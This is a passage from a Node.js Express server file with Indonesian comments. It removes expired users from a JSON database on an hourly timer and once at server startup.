        db.users = usersAktif; // Ganti data user lama dengan yang sudah disaring
        writeDB(db); // Tulis kembali ke file db.json
        console.log(`Berhasil menghapus ${usersAwal - usersAktif.length} user yang kedaluwarsa.`);
    } else {
        console.log('Tidak ada user kedaluwarsa yang ditemukan.');
    }
};

// Menjalankan "robot" ini secara otomatis setiap 1 jam
const JEDA_WAKTU_1_JAM = 60 * 60 * 1000; // 1 jam dalam milidetik
setInterval(hapusUserKedaluwarsa, JEDA_WAKTU_1_JAM);


// Di bagian paling bawah file index.js
app.listen(PORT, () => {
    console.log(`Server API berjalan di port ${PORT}`);
    
    // Jalankan tugas bersih-bersih saat server pertama kali start
    hapusUserKedaluwarsa(); 
});